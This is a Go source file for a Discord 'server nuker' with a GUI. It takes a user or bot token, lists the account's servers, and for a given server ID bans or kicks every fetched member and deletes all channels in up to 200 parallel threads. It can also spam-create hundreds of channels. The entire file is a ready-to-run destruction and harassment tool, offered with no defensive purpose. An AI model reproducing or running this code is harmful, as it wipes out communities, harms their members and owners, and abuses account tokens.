

package main

import (
	"os"
	"fmt"
	"strconv"
	"image/color"
	gui "github.com/AllenDang/giu"
	"github.com/AllenDang/giu/imgui"
	"github.com/bwmarrin/discordgo"
)

// Variables
var (
	Session                *discordgo.Session
	Token                  string
	UserName               string
	ServerID               string
	ChannelCreationName    string
	GuildLogger            string
	TaskLogger             string
	ChannelName            string
	Threads                int32
	ChannelNumber          int32
	Bot                    bool
)

func loop() {

	if Session != nil { 
		UserName = Session.State.User.Username + "#" + Session.State.User.Discriminator
	} else {
		UserName = "None"
	}
	
	imgui.PushStyleVarFloat(imgui.StyleVarWindowBorderSize, 0)
	gui.PushColorWindowBg(color.RGBA{0, 0, 0, 0})
	gui.PushColorFrameBg(color.RGBA{0, 0, 0, 0})

	gui.SingleWindowWithMenuBar("windowTitle", gui.Layout{
		gui.MenuBar(gui.Layout {
			gui.Menu("File", gui.Layout {
				gui.MenuItem("Exit", func() {
					os.Exit(0)
				}),
			}),
		}),

		gui.Label(fmt.Sprintf("\nWIP - Azael#1337\nThreads - %v \nBot - %v \nChannel count - %v \nLogged in as - %v \n\n", Threads, Bot, ChannelNumber, UserName)),

		gui.TabBar("Tabbar Input", gui.Layout{
			gui.TabItem("Guild list", gui.Layout {
				gui.LabelWrapped(GuildLogger),
			}),

			gui.TabItem("Server nuker", gui.Layout {
				gui.InputText("Server ID", 150, &ServerID),
				gui.Button("Nuke", startNuke),

				gui.Label("\n\n"),

				gui.InputText("Name of channels to create", 64, &ChannelName),
				gui.Button("Spam Channels", channelSpamWorker),
			}),

			gui.TabItem("Configuration", gui.Layout {
				gui.Line ( 
					gui.InputText("Discord Token", 200, &Token),
					gui.Checkbox("Bot Token?", &Bot, nil),
				),
				gui.Line ( 
					gui.Button("Login", func() {
						login()
					}),
					gui.Button("Logout", func() {
						_ = Session.Close()
					}),
				),

				gui.Label("\n\n"),
				gui.SliderInt("Thread count", &Threads, 1, 200, fmt.Sprintf("Thread # : %s", strconv.Itoa(int(Threads)))),
				gui.SliderInt("Channel count", &ChannelNumber, 1, 500, fmt.Sprintf("Channel # : %s", strconv.Itoa(int(ChannelNumber)))),
			}),

			gui.TabItem("Logging", gui.Layout {
				gui.LabelWrapped(TaskLogger),
			}),

		}),

	})
	gui.PopStyleColor()
	gui.PopStyleColor()
	imgui.PopStyleVar()
}

func login() {
	if Bot == true {
		Session, _ = discordgo.New("Bot " + Token)
	} else {
		Session, _ = discordgo.New(Token)
	}	
	getAllGuildsWorker()
	err := Session.Open()
	if err != nil {
		fmt.Println("Error opening connection,", err)
		return
	}
}

func startNuke() {
	if Session == nil {
		login()
	}
	members, _ := Session.GuildMembers(ServerID, "", 1000)
	memberChannel := make(chan discordgo.Member, 100)
	for i := 0; i < int(Threads); i++ {
		go banMemberWorker(&memberChannel, Session)
	}
	for _, member := range members {
		memberChannel <- *member
	}
	channels, _ := Session.GuildChannels(ServerID)
	channelChannel := make(chan discordgo.Channel, 100)
	for i := 0; i < int(Threads); i++ {
		go deleteChannelWorker(&channelChannel, Session)
	}	
	for _, channel := range channels {
		channelChannel <- *channel
	}
}

func getAllGuildsWorker() {
	guildList, _ := Session.UserGuilds(0, "", "")
	for _, guild := range guildList {
		GuildLogger += fmt.Sprintf("Guild : %v => %v \n", guild.Name, guild.ID)
	}
}

func channelSpamWorker() {
	if Session == nil {
		login()
	}
	jobs := make(chan int, 100)
	for i := 0; i < int(ChannelNumber); i++ {
		jobs <- 1
	}
	for i := 0; i < int(Threads); i++ {
		go createChannelWorker(&jobs, Session)
	}
}

func createChannelWorker(jobs *chan int, Session *discordgo.Session) {
	for range *jobs {
		_, err := Session.GuildChannelCreate(ServerID, ChannelCreationName, discordgo.ChannelTypeGuildText)
		if err == nil {
			TaskLogger += fmt.Sprintf("Created channel %s\n", ChannelCreationName)
		}
	}
}

func deleteChannelWorker(input *chan discordgo.Channel, Session *discordgo.Session) {
	for channel := range *input {
		_, err := Session.ChannelDelete(channel.ID)
		if err == nil {
			TaskLogger += fmt.Sprintf("Deleted %s\n", channel.Name)
		}
	}
}

func banMemberWorker(input *chan discordgo.Member, Session *discordgo.Session) {
	for member := range *input {
		err := Session.GuildBanCreateWithReason(ServerID, member.User.ID, "", -1)
		if err == nil {
			TaskLogger += fmt.Sprintf("Banned %s\n", member.User.Username)
		} else {
			err = Session.GuildMemberDelete(ServerID, member.User.ID)
			if err == nil {
				TaskLogger += fmt.Sprintf("Kicked %s\n", member.User.Username)
			}
		}
	}
}

func main() {
	ChannelNumber = 1
	Threads = 50
	window := gui.NewMasterWindow("nuker test", 1000, 400, gui.MasterWindowFlagsNotResizable, nil)
	window.Main(loop)
}
